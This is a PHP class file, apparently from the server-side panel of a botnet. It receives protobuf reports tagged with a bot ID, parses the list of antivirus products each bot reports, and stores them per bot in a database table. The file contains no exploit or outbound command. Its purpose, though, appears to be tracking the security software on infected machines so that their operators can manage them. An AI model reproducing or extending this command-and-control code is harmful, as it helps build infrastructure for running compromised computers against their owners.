<?php

require_once 'ReportHandler.php';
require_once 'application/modules/protobuf/pb_proto_protocol.php';

class ReportAntivirusesHandler extends ReportHandler
{
    public function grabDataFromProtobuf($input_data, $botid)
    {
        $reportAntiviruses = new reportAntiviruses();
        $reportAntiviruses->ParseFromString($input_data);
        $this->data = $reportAntiviruses->getAssocArray();
        $this->data['bot_id'] = $this->getRowIdByBotId($botid);
    }

    public function storeDataToServer()
    {
        try
        {
            if ($this->dataIsEmpty())
            {
                return false;
            }

            $this->getDB()->beginTransaction();

            $antiviruses = explode(';', $this->data['antiviruses_list']);

            foreach ($antiviruses as $antivirus)
            {
                if (empty($antivirus) || $this->rowIsExist($this->data['bot_id'], $antivirus))
                {
                    continue;
                }
                $this->getDB()->insert('reports_antivirus', array('bot_id' => $this->data['bot_id'], 'name' => $antivirus));
            }
            $this->getDB()->commit();
        }
        catch (Exception $e)
        {
            $this->getDB()->rollBack();
            Logger::Error('ReportAntivirusesHandler', 'storeDataToServer (exception)', $e, null, json_encode($this->data));
            return false;
        }
        return true;
    }

    protected function dataIsEmpty()
    {
        if (empty($this->data['antiviruses_list']))
            return true;
        return false;
    }

    private function rowIsExist($botid, $name)
    {
        return $this->getDB()->count('reports_antivirus', 'bot_id=:bot_id AND name=:name',
                array(':bot_id' => $botid, ':name' => $name)) > 0;
    }


}